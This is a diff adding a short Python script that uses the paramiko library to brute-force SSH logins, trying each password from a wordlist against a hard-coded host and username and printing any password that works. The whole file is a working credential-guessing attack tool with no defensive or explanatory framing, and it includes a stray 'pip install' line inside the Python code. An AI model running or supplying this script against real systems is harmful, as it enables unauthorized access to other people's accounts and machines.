@@ -1,0 +1,27 @@
+pip install paramiko
+
+import paramiko
+
+ip_address = "192.168.1.17"
+username = "noah"
+wordlist = "wordlist.txt"
+
+def ssh_brute_force(ip, user, wordlist):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    with open (wordlist, "r") as file:
+        for password in file:
+            password = password.strip()
+            try:
+                ssh.connect(ip, username=user, password=password)
+                print(f"pass found:{password} ")
+                return True
+            except paramiko.AuthenticationException:
+                print(f"The pass {password} failed!  ")
+            except Exception as e: 
+                print(f"Error:{e} ")
+    return False
+
+if __name__ == "__main__":
+    ssh_brute_force(ip_address, username, wordlist)
